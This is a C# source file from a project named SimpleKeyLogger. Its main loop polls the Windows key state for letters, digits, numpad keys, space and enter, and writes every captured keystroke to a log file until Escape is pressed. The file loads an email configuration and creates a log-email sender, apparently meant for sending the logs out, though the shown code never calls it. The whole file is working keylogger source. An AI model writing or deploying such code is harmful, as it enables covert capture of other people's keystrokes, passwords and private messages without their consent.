using Newtonsoft.Json;
using SimpleKeyLogger.EmailSender;
using SimpleKeyLogger.FileAdapters;
using SimpleKeyLogger.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace SimpleKeyLogger
{
    class Program
    {
        
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static void Main(string[] args)
        {
            string configText = File.ReadAllText("AppConfig.json");
            AppConfig config = JsonConvert.DeserializeObject<AppConfig>(configText);
            LoggerEmailSender sender = new LoggerEmailSender(config);
            bool endOfProgram = false;
            TextFileAdapter file = new TextFileAdapter("log", "");
            List<int> charSet = new List<int>();
            for (int i = 48; i <= 57; i++) charSet.Add(i);
            for (int i = 65; i <= 90; i++) charSet.Add(i);
            for (int i = 96; i <= 105; i++) charSet.Add(i);
            charSet.Add(32);
            charSet.Add(13);
            charSet.Add(27);

            while (true)
            {
                Thread.Sleep(100);

                foreach (int i in charSet)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 1 || keyState == 32769)
                    {


                        if (i >= 96 && i <= 105)
                        {
                            //Console.WriteLine((char)(i - 48));
                            file.WriteToFile(((char)(i - 48)).ToString());
                        }
                        else if (i == 27) endOfProgram = true;
                        else
                        {
                            //Console.WriteLine((char)i);
                            file.WriteToFile(((char)i).ToString());
                        }

                        break;
                    }
                }
                if (endOfProgram) break;
            }
            file.CloseFile();
        }
    }
}
